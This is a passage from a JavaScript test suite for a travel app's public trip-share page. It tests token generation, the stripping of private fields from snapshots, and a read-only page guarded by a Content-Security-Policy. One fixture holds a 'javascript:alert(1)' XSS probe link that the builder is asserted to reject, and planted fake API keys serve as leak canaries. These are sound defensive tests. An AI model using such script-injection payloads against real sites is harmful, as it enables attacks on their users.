// ---------------------------------------------------------------------------
// Phase B: the public share
// ---------------------------------------------------------------------------
// The token, the snapshot and what a snapshot may never contain. All pure, so
// all of it is testable here; the RPC, the crypto and the UI live in the
// shells and are verified in the browser.

const SHARE_BYTES = [0, 1, 15, 16, 127, 128, 200, 255, 3, 4, 5, 6, 7, 8, 9, 10];
const SHARE_HEX = '00010f107f80c8ff030405060708090a';

test('a share token is 32 hex characters, and refuses a weak source', () => {
  const tok = C.shareKit.token(SHARE_BYTES);
  assert.equal(tok, SHARE_HEX);
  assert.equal(tok.length, 32);
  assert.ok(/^[0-9a-f]{32}$/.test(tok));
  // Too few bytes is not "a shorter token", it is a guessable one. Refused.
  assert.throws(() => C.shareKit.token([1, 2, 3]));
  assert.throws(() => C.shareKit.token(null));
  assert.throws(() => C.shareKit.token('not bytes at all'));
  // And a name never buys its way past that: a weak source is still refused.
  assert.throws(() => C.shareKit.token([1, 2, 3], 'Rob'));
});

test('the name half of a share token is cosmetic and slugified', () => {
  const S = C.shareKit.nameSlug;
  assert.equal(S('Rob'), 'rob');
  assert.equal(S('Rob Riggs'), 'rob-riggs');
  // Accents lose the mark and keep the letter, so a link stays readable.
  assert.equal(S('José Muñoz'), 'jose-munoz');
  // A letter with no decomposition (Æ, ø) is not a diacritic and degrades to a
  // hyphen exactly as slug() has always done. Cosmetic half, so this is fine.
  assert.equal(S('Ærø Ångström'), 'r-angstrom');
  // Punctuation collapses to single hyphens and never edges the slug.
  assert.equal(S("  O'Brien-Smith,  Jr.  "), 'o-brien-smith-jr');
  assert.equal(S('!!!Rob!!!'), 'rob');
  assert.equal(S('a___b...c'), 'a-b-c');
  // Nothing usable in it: no prefix at all, never a bare hyphen.
  assert.equal(S(''), '');
  assert.equal(S('   '), '');
  assert.equal(S('🎉🎉🎉'), '');
  assert.equal(S('...!!!'), '');
  assert.equal(S(null), '');
  assert.equal(S(undefined), '');
  assert.equal(S(42), '');
  // Capped, and re-trimmed so a cut landing on a hyphen cannot leave one.
  const long = S('Bartholomew Fitzwilliam Montgomery III');
  assert.equal(long, 'bartholomew-fitzwilliam');
  assert.ok(long.length <= C.shareKit.NAME_CAP);
  assert.equal(long.charAt(long.length - 1) === '-', false);
  assert.ok(S('x'.repeat(200)).length <= C.shareKit.NAME_CAP);
});

test('a readable token spends no entropy on the name half', () => {
  // The whole point: the hex half is byte-for-byte the same token whether a
  // name rides in front of it or not. 16 bytes of crypto randomness, 128 bits,
  // 32 hex characters, unchanged.
  assert.equal(C.shareKit.token(SHARE_BYTES, 'Rob'), 'rob-' + SHARE_HEX);
  assert.equal(C.shareKit.token(SHARE_BYTES, 'Rob Riggs'), 'rob-riggs-' + SHARE_HEX);
  assert.equal(C.shareKit.token(SHARE_BYTES, 'José Muñoz'), 'jose-munoz-' + SHARE_HEX);
  // A name that slugifies to nothing falls back to the random half ALONE: never
  // a leading hyphen, never an empty prefix.
  ['', '   ', '🎉', '!!!', null, undefined].forEach(n => {
    assert.equal(C.shareKit.token(SHARE_BYTES, n), SHARE_HEX,
      'a nameless token must be the bare hex, name=' + JSON.stringify(n));
  });
  // Every readable token still ends in the full 32 hex characters.
  ['Rob', 'José Muñoz', 'Bartholomew Fitzwilliam Montgomery III'].forEach(n => {
    const t = C.shareKit.token(SHARE_BYTES, n);
    assert.equal(t.slice(-32), SHARE_HEX, 'the entropy half was cut short for ' + n);
    assert.equal(C.shareKit.TOKEN_BYTES, 16);
  });
});

test('an already-issued token keeps working, and only Rotate replaces it', () => {
  // The lookup is an exact string match on the whole token (the get_share RPC
  // does `where token = share_token`), so a link sent before readable tokens
  // existed resolves untouched. Nothing here migrates or invalidates one.
  const legacy = 'a7f3c2d9' + '0'.repeat(24);
  assert.equal(legacy.length, 32);
  assert.equal(C.shareKit.tokenFromUrl('#' + legacy, ''), legacy);
  assert.equal(C.shareKit.tokenValue(legacy), legacy);
  assert.equal(C.shareKit.url('https://app.nomadding.com', legacy),
    'https://app.nomadding.com/share/#' + legacy);

  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  // Publish REUSES the token it already has and only makes one when there is
  // none. This is what stops an Update publish from quietly breaking a link
  // that is already in somebody's inbox.
  assert.ok(/token = row\.token \|\| newShareToken\(\);/.test(trip),
    'publish must reuse the row\'s existing token, never mint a new one on update');
  // Rotate is the ONE door that issues a new token, and it is confirmed twice.
  // Its arm key carries the row id, so confirming a rotate on one link cannot
  // arm a rotate on another.
  const rot = trip.match(/function rotateShareLink\(id\) \{[\s\S]*?\n\}/);
  assert.ok(rot, 'rotateShareLink missing from the built trip page');
  assert.ok(/token = newShareToken\(\);/.test(rot[0]), 'rotate must mint a new token');
  assert.ok(/armConfirm\('rotateShare:' \+ id/.test(rot[0]), 'rotate must be confirmed per row');
  // And the new token is the readable kind: the display name rides in front.
  assert.ok(/CityOps\.shareKit\.token\(\s*[\s\S]*?state\.travelerName \|\| ''\)/.test(trip),
    'newShareToken must pass the display name as the readable half');
});

test('the share URL is the fragment form, so the token never leaves the browser', () => {
  const url = C.shareKit.url('https://app.nomadding.com', 'a'.repeat(32));
  assert.equal(url, 'https://app.nomadding.com/share/#' + 'a'.repeat(32));
  // A readable token rides the fragment the same way.
  assert.equal(C.shareKit.url('https://app.nomadding.com', 'rob-' + 'a'.repeat(32)),
    'https://app.nomadding.com/share/#rob-' + 'a'.repeat(32));
  // A trailing slash on the origin must not double up.
  assert.equal(C.shareKit.url('https://app.nomadding.com/', 'b'.repeat(32)),
    'https://app.nomadding.com/share/#' + 'b'.repeat(32));
});

// The fixture table both parsers have to agree on. The engine owns the rule and
// the share page carries its own copy (it ships without the engine), so the
// test below runs the page's copy against exactly these cases.
const SHARE_URL_CASES = [
  ['#' + 'a'.repeat(32), '', 'a'.repeat(32)],
  ['#' + 'A'.repeat(32), '', 'a'.repeat(32)],               // case folded
  ['', '?t=' + 'c'.repeat(32), 'c'.repeat(32)],
  ['', '?token=' + 'd'.repeat(32), 'd'.repeat(32)],
  ['', '?x=1&t=' + 'e'.repeat(32) + '&y=2', 'e'.repeat(32)],
  ['#' + 'f'.repeat(32), '?t=' + '9'.repeat(32), 'f'.repeat(32)],  // the hash wins
  ['', '', ''],
  ['#city=batumi-2026-08-08', '', ''],                      // the OTHER fragment
  ['#' + 'a'.repeat(20), '', ''],                           // too short to be one
  ['#' + 'z'.repeat(32), '', ''],                           // not hex
  ['', '?t=' + 'z'.repeat(32), ''],
  // Readable tokens: a slugified name, a hyphen, then the same 32 hex. The
  // name half is cosmetic, so the parser only has to hand the WHOLE string back
  // for the exact-match lookup.
  ['#rob-' + 'a'.repeat(32), '', 'rob-' + 'a'.repeat(32)],
  ['#ROB-' + 'A'.repeat(32), '', 'rob-' + 'a'.repeat(32)],  // case folded
  ['#rob-riggs-' + 'b'.repeat(32), '', 'rob-riggs-' + 'b'.repeat(32)],
  ['#jose-munoz-' + 'c'.repeat(32), '', 'jose-munoz-' + 'c'.repeat(32)],
  ['#x1-' + 'd'.repeat(32), '', 'x1-' + 'd'.repeat(32)],    // digits are fine in a name
  ['', '?t=rob-' + 'e'.repeat(32), 'rob-' + 'e'.repeat(32)],
  ['', '?token=rob-' + 'f'.repeat(32), 'rob-' + 'f'.repeat(32)],
  // A name half with no entropy behind it is not a token.
  ['#rob-' + 'z'.repeat(32), '', ''],
  ['#rob-abc', '', ''],
  ['#rob', '', ''],
  // Shapes the generator cannot produce are refused rather than passed through.
  ['#-rob-' + 'a'.repeat(32), '', ''],                      // leading hyphen
  ['#rob--' + 'a'.repeat(32), '', ''],                      // doubled hyphen
  ['#rob-' + 'a'.repeat(32) + '-', '', ''],                 // trailing hyphen
  ['#' + 'x'.repeat(200) + '-' + 'a'.repeat(32), '', '']    // longer than any token
];

test('the share token is read from the fragment first and the query second', () => {
  SHARE_URL_CASES.forEach(([hash, search, want]) => {
    assert.equal(C.shareKit.tokenFromUrl(hash, search), want,
      'hash=' + JSON.stringify(hash) + ' search=' + JSON.stringify(search));
  });
});

// The share page ships WITHOUT the engine (it is a read-only page for people
// with no account; 280KB of editor would have nothing to do there), so it
// carries its own copy of the token parser. This is the drift guard: the page's
// copy is pulled out of the built share/index.html and run against the same
// fixtures.
// The parser is two functions now (tokenValue validates one string, tokenFromUrl
// picks which string to try), so both come out together: the slice runs from
// the first to the end of the second, which is also a guard that they stay
// adjacent and self-contained.
function loadShareTokenParser() {
  const fs = require('fs');
  const path = require('path');
  const html = fs.readFileSync(path.join(__dirname, '..', 'share', 'index.html'), 'utf8');
  const start = html.indexOf('function tokenValue(');
  assert.ok(start !== -1, 'tokenValue is missing from the built share page');
  const from = html.indexOf('function tokenFromUrl(', start);
  assert.ok(from !== -1, 'tokenFromUrl is missing from the built share page');
  const end = html.indexOf('\n}\n', from);
  assert.ok(end !== -1, 'could not find the end of tokenFromUrl');
  return new Function(html.slice(start, end + 2) + '\nreturn tokenFromUrl;')();
}

test('the share page reads a token exactly the way the engine says to', () => {
  const pageParser = loadShareTokenParser();
  SHARE_URL_CASES.forEach(([hash, search, want]) => {
    assert.equal(pageParser(hash, search), want,
      'the share page disagrees with the engine on hash=' + JSON.stringify(hash) +
      ' search=' + JSON.stringify(search));
  });
});

// ---- the snapshot builder and its exclusions ----
// The trip state this builds from, deliberately loaded with everything that
// must NOT come out the other side.
const SHARE_STATE = {
  travelerName: 'Rob',
  cities: [
    { id: 'c1', name: 'Batumi', country: 'GE', state: '', status: 'booked',
      checkIn: '2026-08-08', checkOut: '2026-08-15', lat: 41.64, lng: 41.61,
      estCost: 1800, currency: 'GEL', notes: 'landlord takes cash only',
      accommodations: [
        { id: 'a1', name: 'Sea View Flat', city: 'Batumi', neighborhood: 'Old Town',
          link: 'https://booking.example/x', status: 'booked',
          checkIn: '2026-08-08', checkOut: '2026-08-15',
          paid: false, cost: 640, currency: 'GEL', confirmation: 'BK-99182',
          notes: 'code 4417 on the door' },
        { id: 'a2', name: 'Rejected Hostel', status: 'considering', checkIn: '', checkOut: '' }
      ] },
    { id: 'c2', name: '', country: 'XX' }   // no name: never publishable
  ],
  transitions: [
    { id: 't1', cityId: 'c1', mode: 'flight', status: 'booked', toCity: 'Tirana',
      departureDate: '2026-08-15', departureTime: '09:40', arrivalDate: '2026-08-15',
      arrivalTime: '11:05', carrier: 'Wizz', number: 'W6 4402',
      cost: 210, confirmation: 'ABC123', notes: 'admin only: seat paid separately', paid: true },
    { id: 't2', cityId: 'c1' }   // neither a destination nor a date: skipped
  ]
};

const SHARE_GUIDE_ROW = {
  city_id: 'batumi-2026-08-08',
  data: {
    schema: 1,
    city: {
      name: 'Batumi', country: 'GE',
      dates: { from: '2026-08-08', to: '2026-08-15' },
      accommodation: { name: 'Sea View Flat, 12 Ninoshvili St', lat: 41.64, lng: 41.61 },
      currency: { code: 'GEL', usd: 0.37 },
      notes: ['landlord takes cash only', 'knee is bad, no hills']
    },
    sections: [{ id: 'dinner', label: 'Dinner', icon: '🍽️' }],
    items: [{
      id: 'brasserie', section: 'dinner', status: 'plan', day: '2026-08-13',
      when: 'Old Town office day', name: 'Brasserie 1900',
      price: { text: '~80 GEL' }, note: 'Reserve ahead.',
      hours: { text: '12:00-23:00 daily', class: 'late' }, tags: ['Book ahead'],
      links: [{ kind: 'map', label: 'Open in Maps', href: 'https://maps.google.com/?cid=1' },
              { kind: 'web', label: 'Bad', href: 'javascript:alert(1)' }],
      place_id: 'ChIJsecret', verified: '2026-08-01',
      rating: { stars: 4.8, count: 442, source: 'Google', checked: '2026-08-01' },
      // A verdict is a TIER plus its reason. There is no `label` field and
      // never was; the second entry here has no tier at all, which is what a
      // hand-edited guide looks like, and must not vanish from a share.
      intel: { verdicts: [{ tier: 'must', text: 'a long dinner' }, { text: 'the set lunch' }],
               tips: ['Ask for the corner table, Rob'],
               source: 'Claude, 2026-08-01', details: 'internal reasoning' }
    }]
  }
};

test('the snapshot carries the trip and drops every private field on it', () => {
  const snap = C.shareKit.build(Object.assign({ generatedAt: '2026-08-28T00:00:00.000Z' }, SHARE_STATE));
  assert.equal(snap.schema, 1);
  assert.equal(snap.travelerName, 'Rob');
  // The unnamed city never ships; the named one does.
  assert.equal(snap.cities.length, 1);
  const stop = snap.cities[0];
  assert.equal(stop.name, 'Batumi');
  assert.equal(stop.estCost, undefined);
  assert.equal(stop.currency, undefined);
  assert.equal(stop.notes, undefined);
  // Only booked and shortlisted stays. And on the one that ships: no paid flag,
  // no cost, no confirmation number, no door code.
  assert.equal(stop.accommodations.length, 1);
  const stay = stop.accommodations[0];
  assert.equal(stay.name, 'Sea View Flat');
  assert.equal(stay.paid, undefined, 'the paid flag must stay private');
  assert.equal(stay.cost, undefined);
  assert.equal(stay.confirmation, undefined);
  assert.equal(stay.notes, undefined);
  assert.equal(stay.link, 'https://booking.example/x');
  // A leg with neither a destination nor a date is not a leg.
  assert.equal(snap.transitions.length, 1);
  const leg = snap.transitions[0];
  assert.equal(leg.carrier, 'Wizz');
  assert.equal(leg.number, 'W6 4402');
  assert.equal(leg.cost, undefined);
  assert.equal(leg.confirmation, undefined);
  assert.equal(leg.notes, undefined);
  assert.equal(leg.paid, undefined);
  // Trip only by default: guides are opt-in, one city at a time.
  assert.deepEqual(snap.guides, []);
  // And lodging is SHOWN by default: hiding it is an explicit per-share choice,
  // so nobody's family share silently loses the flat name on the next publish.
  assert.equal(snap.cities[0].accommodations[0].hidden, undefined);
});

// ---- "Hide where I am staying" ----
// The exclusion is in the BUILDER, not in the share page's rendering. What is
// asserted here is therefore the serialised snapshot: what actually gets
// written to the shares row and handed to anyone with the link.

test('with lodging hidden, the property never reaches the snapshot at all', () => {
  const planted = JSON.parse(JSON.stringify(SHARE_STATE));
  planted.cities[0].accommodations[0].name = 'Villa Kryptonite';
  planted.cities[0].accommodations[0].neighborhood = 'Rue Secrete';
  planted.cities[0].accommodations[0].link = 'https://booking.example/villa-kryptonite';
  const snap = C.shareKit.build(Object.assign(
    { generatedAt: '2026-08-28T00:00:00.000Z', hideLodging: true }, planted));
  const text = JSON.stringify(snap);
  // The whole point: a reader who opens the PAYLOAD finds nothing, because
  // nothing was ever put in it.
  assert.equal(text.indexOf('Villa Kryptonite'), -1, 'a hidden property name reached the snapshot');
  assert.equal(text.indexOf('Rue Secrete'), -1, 'a hidden neighbourhood reached the snapshot');
  assert.equal(text.indexOf('booking.example'), -1, 'a hidden booking link reached the snapshot');
  // What survives is the shape of the route: the city and the nights.
  const stay = snap.cities[0].accommodations[0];
  assert.deepEqual(stay, {
    hidden: true, city: 'Batumi', checkIn: '2026-08-08', checkOut: '2026-08-15'
  });
  assert.equal(stay.name, undefined);
  assert.equal(stay.neighborhood, undefined);
  assert.equal(stay.link, undefined);
  // Status goes too. "booked" on a nameless stay tells a reader nothing they
  // can act on, and still leaks whether the traveler has committed to a place.
  assert.equal(stay.status, undefined);
  // The stop itself is untouched: this option is about lodging, not the route.
  assert.equal(snap.cities[0].name, 'Batumi');
  assert.equal(snap.cities[0].checkIn, '2026-08-08');
  assert.equal(snap.transitions[0].carrier, 'Wizz');
});

test('hidden stays dedupe and never draw an empty row', () => {
  const many = JSON.parse(JSON.stringify(SHARE_STATE));
  many.cities[0].accommodations = [
    { name: 'Flat One', city: 'Batumi', neighborhood: 'Old Town', status: 'shortlisted',
      checkIn: '2026-08-08', checkOut: '2026-08-15' },
    { name: 'Flat Two', city: 'Batumi', neighborhood: 'Boulevard', status: 'shortlisted',
      checkIn: '2026-08-08', checkOut: '2026-08-15' },
    { name: 'Flat Three', city: 'Batumi', neighborhood: 'Port', status: 'booked',
      checkIn: '2026-08-08', checkOut: '2026-08-15' },
    { name: 'Later Flat', city: 'Batumi', status: 'booked',
      checkIn: '2026-08-15', checkOut: '2026-08-20' },
    // Neither a city nor a date: with lodging hidden there is nothing left to
    // draw, so it is dropped rather than rendered as a blank row.
    { name: 'Nowhere Inn', status: 'booked', checkIn: '', checkOut: '' }
  ];
  const on = C.shareKit.build(Object.assign(
    { generatedAt: '2026-08-28T00:00:00.000Z', hideLodging: true }, many));
  const stays = on.cities[0].accommodations;
  // Three overlapping options for the same week collapse to one row: it stops
  // the page counting out loud how many places are still under consideration.
  assert.equal(stays.length, 2);
  assert.deepEqual(stays, [
    { hidden: true, city: 'Batumi', checkIn: '2026-08-08', checkOut: '2026-08-15' },
    { hidden: true, city: 'Batumi', checkIn: '2026-08-15', checkOut: '2026-08-20' }
  ]);
  stays.forEach(s => assert.ok(s.city || s.checkIn || s.checkOut, 'an empty stay row survived'));
  // With the option OFF nothing collapses: all four real stays ship as before.
  const off = C.shareKit.build(Object.assign({ generatedAt: '2026-08-28T00:00:00.000Z' }, many));
  assert.equal(off.cities[0].accommodations.length, 5);
  assert.equal(off.cities[0].accommodations[0].name, 'Flat One');
});

test('a city guide never carries city.accommodation, hidden or not', () => {
  // The trip half decides what lodging is public. The guide half must not be a
  // second, contradicting source for the same fact, so shareGuide has never
  // copied city.accommodation. This feature makes that load-bearing, so it is
  // pinned here in BOTH states of the option.
  const base = Object.assign({ generatedAt: '2026-08-28T00:00:00.000Z' }, SHARE_STATE);
  [false, true].forEach(hide => {
    const snap = C.shareKit.build(Object.assign({}, base, {
      hideLodging: hide, guides: [SHARE_GUIDE_ROW], includeGuides: ['batumi-2026-08-08']
    }));
    const g = snap.guides[0];
    assert.equal(g.accommodation, undefined, 'hideLodging=' + hide);
    const text = JSON.stringify(g);
    assert.equal(text.indexOf('Ninoshvili'), -1, 'a guide lodging address shipped, hideLodging=' + hide);
    assert.equal(text.indexOf('41.64'), -1, 'guide lodging coordinates shipped, hideLodging=' + hide);
    // And the key-name sweep now names it, so a future field addition trips.
    assert.deepEqual(C.shareKit.leaks(snap), [], 'hideLodging=' + hide);
  });
  assert.ok(C.shareKit.FORBIDDEN.indexOf('accommodation') !== -1,
    'the leak sweep must name the city-guide accommodation field');
  assert.deepEqual(C.shareKit.leaks({ city: { accommodation: { name: 'x' } } }), ['accommodation']);
  // The plural trip-side field is a legitimate part of a snapshot and must NOT
  // be swept: the two names differ by one letter and matching is exact.
  assert.deepEqual(C.shareKit.leaks({ cities: [{ accommodations: [] }] }), []);
});

test('a guide only ships when it was ticked, and ships in Share-view form', () => {
  const base = Object.assign({ generatedAt: '2026-08-28T00:00:00.000Z' }, SHARE_STATE);
  // Handed the row but not asked for it: nothing ships.
  const off = C.shareKit.build(Object.assign({}, base, { guides: [SHARE_GUIDE_ROW], includeGuides: [] }));
  assert.deepEqual(off.guides, []);
  // Asked for a city that is not in the rows: still nothing, no crash.
  assert.deepEqual(C.shareKit.build(Object.assign({}, base,
    { guides: [SHARE_GUIDE_ROW], includeGuides: ['nowhere'] })).guides, []);

  const on = C.shareKit.build(Object.assign({}, base,
    { guides: [SHARE_GUIDE_ROW], includeGuides: ['batumi-2026-08-08'] }));
  assert.equal(on.guides.length, 1);
  const g = on.guides[0];
  assert.equal(g.name, 'Batumi');
  assert.equal(g.from, '2026-08-08');
  // The lodging address and its coordinates, the currency, and the free-text
  // city notes (which carry a medical fact here) all stay behind.
  assert.equal(g.accommodation, undefined);
  assert.equal(g.currency, undefined);
  assert.equal(g.notes, undefined);
  assert.equal(JSON.stringify(g).indexOf('Ninoshvili'), -1);
  assert.equal(JSON.stringify(g).indexOf('knee is bad'), -1);

  const it = g.items[0];
  assert.equal(it.name, 'Brasserie 1900');
  assert.equal(it.price, '~80 GEL');
  assert.equal(it.hours, '12:00-23:00 daily');
  // Provenance is meaningless outside the app and goes.
  assert.equal(it.place_id, undefined);
  assert.equal(it.verified, undefined);
  // Share view: stars only, no count and no source.
  assert.equal(it.stars, 4.8);
  assert.equal(it.rating, undefined);
  assert.equal(JSON.stringify(it).indexOf('442'), -1);
  assert.equal(JSON.stringify(it).indexOf('Google'), -1);
  // Share view: verdicts only, no tips and no reasoning.
  // The TIER is the verdict. It used to be dropped here (the builder copied a
  // `label` no verdict has), so every published share rendered the reason with
  // no Must/Good/Skip attached to it. A tier-less verdict falls back to good
  // rather than being dropped.
  assert.deepEqual(it.verdicts, [
    { tier: 'must', text: 'a long dinner' },
    { tier: 'good', text: 'the set lunch' }
  ]);
  assert.equal(it.verdicts[0].label, undefined, 'the dead label field came back');
  assert.equal(it.tips, undefined);
  assert.equal(JSON.stringify(it).indexOf('corner table'), -1);
  assert.equal(JSON.stringify(it).indexOf('internal reasoning'), -1);
  // A javascript: link is refused, exactly as it is in the app.
  assert.equal(it.links.length, 1);
  assert.equal(it.links[0].href, 'https://maps.google.com/?cid=1');
});

test('nothing a credential could hide in survives into a snapshot', () => {
  // The mechanism is the fixed field lists above. This is the belt: feed the
  // builder a state with a credential in every plausible place and assert the
  // whole serialised snapshot mentions none of it.
  const dirty = JSON.parse(JSON.stringify(SHARE_STATE));
  dirty.apiKey = 'sk-ant-LEAK';
  dirty.githubToken = 'github_pat_LEAK';
  dirty.cities[0].apiKey = 'sk-ant-LEAK';
  dirty.cities[0].accommodations[0].githubToken = 'github_pat_LEAK';
  dirty.transitions[0].apiKey = 'sk-ant-LEAK';
  const guide = JSON.parse(JSON.stringify(SHARE_GUIDE_ROW));
  guide.data.apiKey = 'sk-ant-LEAK';
  guide.data.genmeta = { 'batumi-2026-08-08': { accommodation: '12 Ninoshvili St', notes: 'diet: coeliac' } };
  guide.data.items[0].apiKey = 'sk-ant-LEAK';
  const snap = C.shareKit.build(Object.assign({ generatedAt: '2026-08-28T00:00:00.000Z' }, dirty,
    { guides: [guide], includeGuides: ['batumi-2026-08-08'] }));
  const text = JSON.stringify(snap);
  assert.equal(text.indexOf('sk-ant-LEAK'), -1);
  assert.equal(text.indexOf('github_pat_LEAK'), -1);
  assert.equal(text.indexOf('coeliac'), -1, 'genmeta trip notes reached a public page');
  assert.equal(text.indexOf('Ninoshvili'), -1, 'a genmeta address reached a public page');
  // And the key-name sweep agrees: no forbidden key anywhere in the tree.
  assert.deepEqual(C.shareKit.leaks(snap), []);
  // The sweep is only worth having if it actually catches one.
  assert.deepEqual(C.shareKit.leaks({ cities: [{ paid: true }] }), ['paid']);
});

// ---- the shipped bytes ----

test('the share page is public-safe: one door, no engine, no worker', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const page = fs.readFileSync(path.join(root, 'share', 'index.html'), 'utf8');
  const engine = fs.readFileSync(path.join(root, 'src', 'cityops.js'), 'utf8');
  // No engine, and no editor: this is a page for people with no account.
  assert.equal(page.indexOf(engine), -1, 'the editor engine must not ship on the public share page');
  assert.ok(page.length < 120000, 'the share page has grown an engine-sized limb');
  // Exactly one Supabase endpoint, and it is the security-definer function.
  const calls = page.match(/\/rest\/v1\/[a-z_/]+/g) || [];
  assert.deepEqual(calls, ['/rest/v1/rpc/get_share'],
    'the share page must reach exactly one endpoint: ' + calls.join(', '));
  assert.equal(page.indexOf('/rest/v1/shares'), -1, 'the share page must never touch the table');
  // The publishable key, and no other credential material of any kind.
  assert.ok(/anon: 'sb_publishable_/.test(page));
  assert.equal(page.indexOf('service_role'), -1);
  assert.equal(page.indexOf('sk-ant-'), -1);
  assert.equal(page.indexOf('github_pat_'), -1);
  assert.equal(page.indexOf('/auth/v1/'), -1, 'the share page must not carry a sign-in flow');
  // No service worker of its own, and no storage: a stranger's browser is not
  // a place to leave anything, and a cached payload would outlive a rotation.
  assert.equal(page.indexOf('serviceWorker'), -1);
  assert.equal(page.indexOf('ocalStorage'), -1);
  // Not indexable. A share link is unguessable; a crawler that found one and
  // published it would make that moot.
  assert.ok(/<meta name="robots" content="noindex, nofollow">/.test(page));
  // Absolute doors, per the Phase A lesson: this page sits at /share/, and a
  // relative base would resolve every guide link one level down into nothing.
  // The base is derived from the serving origin now (2026-09-01, so a host move
  // cannot leave dead doors on an already-published share), but the FALLBACK it
  // lands on when there is no origin to derive from, which is the downloaded
  // file:// life, still has to be absolute or that lesson is undone.
  assert.ok(/const CITYOPS_FALLBACK = 'https:\/\/[a-z0-9.-]+';/.test(page),
    'the share page fallback base must be an absolute origin');
  assert.equal(page.indexOf("const CITYOPS_BASE = '"), -1,
    'the share page base must be derived, not a literal');
});

// ---- the read-only contract ----
// Owner ask 2026-09-01: a share link may let people read the plan and open and
// close a guide, and nothing else. The page enforces that structurally rather
// than by hiding controls in CSS, and these are the guards on that.

function sharePageBytes() {
  const fs = require('fs');
  const path = require('path');
  return fs.readFileSync(path.join(__dirname, '..', 'share', 'index.html'), 'utf8');
}

// The page's whole script, run in Node against a stub DOM, so the render
// helpers can be called for real instead of pattern-matched. Same idea as
// tests/harness.js does for the engine: boot() runs, finds no snapshot and no
// token, draws the "missing code" state into the stubs, and stops there.
function loadSharePage() {
  const html = sharePageBytes();
  const blocks = html.match(/<script>\n([\s\S]*?)\n<\/script>/g) || [];
  assert.equal(blocks.length, 1, 'the share page should carry exactly one inline script block');
  const body = blocks[0].replace(/^<script>\n/, '').replace(/\n<\/script>$/, '');
  const node = () => ({
    textContent: '', innerHTML: '', hidden: false, href: '', open: false,
    style: {}, setAttribute() {}, getAttribute() { return null; },
    querySelector() { return null; }, scrollIntoView() {}, focus() {}
  });
  const doc = {
    getElementById: node, querySelector: node, querySelectorAll: () => [],
    addEventListener() {}, title: ''
  };
  const fn = new Function('document', 'window', 'location', 'fetch', 'L',
    body + '\nreturn { READ_ONLY: READ_ONLY, deepFreeze: deepFreeze,' +
    ' cityGuideLink: cityGuideLink, guideCardHTML: guideCardHTML,' +
    ' guideItemHTML: guideItemHTML, citySlug: citySlug,' +
    ' setGuideIds: function (v) { GUIDE_IDS = v; } };');
  return fn(doc, {}, { hash: '', search: '' }, undefined, undefined);
}

test('the share page ships no control that could change the plan', () => {
  const page = sharePageBytes();
  // Reordering, by pointer, by touch and by keyboard. None of the machinery
  // that makes a card movable may exist here in any spelling.
  ['draggable', 'dragstart', 'dragover', 'dragend', 'dropEffect', 'ondrop',
   'pointerdown', 'pointermove', 'touchstart', 'touchmove', 'grip', 'dragrow',
   'planlist', 'seclist'].forEach(sym => {
    assert.equal(page.indexOf(sym), -1, 'the share page carries drag machinery: ' + sym);
  });
  // Anything that edits: a field to type in, a box to tick, a control row, a
  // day picker, a status change, a rename, a pin, an add.
  ['<input', '<textarea', '<select', '<form', 'contenteditable', 'ctl-row',
   'dayMoveOptions', 'setDay(', 'setStatus(', 'setTitle(', 'togglePin',
   'newPlaceDelta', 'mergeDelta', 'openMoreSheet'].forEach(sym => {
    assert.equal(page.indexOf(sym), -1, 'the share page carries an editing path: ' + sym);
  });
  // The read-only flag is declared, so the contract is stated in the file the
  // page ships as, not only in a plan document.
  assert.ok(/const READ_ONLY = true;/.test(page), 'the read-only declaration is gone');
  // Exactly two controls a reader can press, and both are navigation: the map
  // reset that is in the static markup, and the jump to a guide card that is
  // already on this page, which the renderer builds. Any third button is a
  // control this page has no business having, so this counts them.
  const buttons = (page.match(/<button[^>]*class="[^"]*"/g) || [])
    .map(b => (b.match(/class="([^"]*)"/) || [])[1]);
  assert.deepEqual(buttons, ['map-reset-btn', 'guide-link jump'],
    'a button this page should not have: ' + buttons.join(' / '));
});

test('the browser itself refuses this page any way to write', () => {
  const page = sharePageBytes();
  const m = page.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/);
  assert.ok(m, 'the share page lost its Content-Security-Policy');
  const csp = m[1];
  // No form may ever be submitted, and no <base> may redirect a relative URL.
  assert.ok(/form-action 'none'/.test(csp));
  assert.ok(/base-uri 'none'/.test(csp));
  // The ONE origin this page may talk to. Not a wildcard, not the whole web:
  // if a future edit adds a write call to anywhere else, the browser blocks it
  // before the request leaves, which is enforcement rather than good intentions.
  assert.ok(/connect-src https:\/\/ggscdbbvqmqiyguiccrf\.supabase\.co;/.test(csp), csp);
  assert.ok(/default-src 'none';/.test(csp), csp);
  // And in the bytes: one fetch, one verb, and the verb is the read RPC's POST.
  assert.equal((page.match(/fetch\(/g) || []).length, 1, 'the share page makes more than one call');
  const verbs = page.match(/method: '[A-Z]+'/g) || [];
  assert.deepEqual(verbs, ["method: 'POST'"], 'the share page uses a write verb: ' + verbs.join(', '));
  ['PATCH', 'DELETE', 'PUT', 'XMLHttpRequest', 'sendBeacon', 'navigator.send']
    .forEach(sym => assert.equal(page.indexOf(sym), -1, 'the share page can write: ' + sym));
});

test('a stop\'s guide door stays on this page and never opens the editor', () => {
  const page = sharePageBytes();
  // The bug Rob hit on his first real share: this pill linked to
  // cityops.robriggs.com/#city=<id>, which on his own signed-in browser opened
  // his guide in the EDITOR, drag handles and all. A share page may not have a
  // door into the editor at all. Matched on the code, not on any occurrence of
  // the string: the file explains this history in prose, and prose is allowed
  // to name the thing it is explaining.
  assert.equal(page.indexOf("'/#city='"), -1, 'the editor door is back');
  assert.ok(!/CITYOPS_BASE \+ ['"]\/#city=/.test(page), 'the editor door is back');
  assert.ok(!/href=[^>]*#city=/.test(page), 'the editor door is back');
  // The jump target, and the reason the jump is a button: writing the fragment
  // would overwrite this page's own share token.
  assert.ok(/data-guide-id="/.test(page));
  assert.ok(/function jumpToGuide\(id\)/.test(page));
  assert.equal(page.indexOf('location.hash ='), -1, 'something writes the fragment the token lives in');
});

test('the guide door only appears for a guide that is on this page', () => {
  const S = loadSharePage();
  assert.equal(S.READ_ONLY, true);
  const stop = { name: 'Batumi', country: 'GE', checkIn: '2026-08-08', checkOut: '2026-08-15' };
  // Trip-only snapshot: no guide is embedded, so no guide is promised. The
  // planner door is offered instead, and it carries nothing of the traveler's.
  S.setGuideIds([]);
  const none = S.cityGuideLink(stop);
  assert.ok(none.indexOf('Plan this city') !== -1, none);
  assert.ok(none.indexOf('<button') === -1, none);
  // Guides included: the door is an in-page jump, not a link off this page.
  S.setGuideIds(['batumi-2026-08-08']);
